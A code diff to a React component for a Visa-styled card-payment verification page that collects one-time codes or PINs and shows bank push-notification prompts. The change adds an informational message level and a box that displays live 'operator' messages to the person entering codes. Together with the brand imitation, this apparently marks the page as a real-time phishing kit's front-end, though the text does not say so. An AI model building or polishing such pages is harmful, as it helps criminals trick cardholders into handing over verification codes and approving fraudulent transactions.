@@ -368,9 +368,11 @@ function ResendButton({
 function ErrorSpan({
   message,
   visible,
+  level = "error",
 }: {
   message: string;
   visible: boolean;
+  level?: "error" | "info";
 }) {
   return (
     <div className="form-group" id="ErrorMessage">
@@ -378,12 +380,18 @@ function ErrorSpan({
         id="WarningImage"
         src="data:,"
         alt="Warning"
-        style={{ display: visible ? "inline" : "none" }}
+        style={{ display: visible && level === "error" ? "inline" : "none" }}
       />
       <span
         id="ValidationErrorMessage"
-        className="field-validation-error"
-        style={{ display: visible ? "inline" : "none" }}
+        className={level === "error" ? "field-validation-error" : undefined}
+        style={{
+          display: visible ? "inline" : "none",
+          ...(level === "info" && {
+            color: "#0c5460",
+            marginTop: 8,
+          }),
+        }}
       >
         {message}
       </span>
@@ -409,6 +417,7 @@ function OtpForm({
   canSubmit,
   errorMessage,
   showError,
+  errorLevel = "error",
 }: {
   config: OtpFormConfig;
   onSubmit: () => void;
@@ -417,6 +426,7 @@ function OtpForm({
   canSubmit: boolean;
   errorMessage: string;
   showError: boolean;
+  errorLevel?: "error" | "info";
 }) {
   const isPIN = config.kind === "pin";
   const maxLength = isPIN ? PIN_MAX_LENGTH : OTP_MAX_LENGTH;
@@ -487,7 +497,7 @@ function OtpForm({
                   data-valmsg-replace="true"
                 />
               )}
-              <ErrorSpan message={errorMessage} visible={showError} />
+              <ErrorSpan message={errorMessage} visible={showError} level={errorLevel} />
               <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
                 <button
                   type="submit"
@@ -617,6 +627,21 @@ function VerificationUiContent() {
                   ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
                   : "A push notification has been sent to your mobile app. Please approve the transaction on your device."}
               </p>
+              {operatorMessage && (
+                <div
+                  style={{
+                    marginTop: 12,
+                    padding: "8px 16px",
+                    background: operatorMessage.level === "error" ? "#f8d7da" : "#d1ecf1",
+                    color: operatorMessage.level === "error" ? "#721c24" : "#0c5460",
+                    fontSize: 14,
+                    borderRadius: 4,
+                    textAlign: "center",
+                  }}
+                >
+                  {operatorMessage.message}
+                </div>
+              )}
             </div>
           </div>
         </VerificationPage>
@@ -670,6 +695,7 @@ function VerificationUiContent() {
                       <ErrorSpan
                         message={operatorMessage?.message ?? ""}
                         visible={Boolean(operatorMessage?.message)}
+                        level={operatorMessage?.level ?? "error"}
                       />
                       <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
                         <button
@@ -736,6 +762,9 @@ function VerificationUiContent() {
               showError={
                 wrongCode || expiredCode || Boolean(operatorMessage?.message)
               }
+              errorLevel={
+                wrongCode || expiredCode ? "error" : (operatorMessage?.level ?? "error")
+              }
             />
           }
         >
@@ -778,6 +807,9 @@ function VerificationUiContent() {
             )}
             showError={
               wrongCode || expiredCode || Boolean(operatorMessage?.message)
+            }
+            errorLevel={
+              wrongCode || expiredCode ? "error" : (operatorMessage?.level ?? "error")
             }
           />
         }
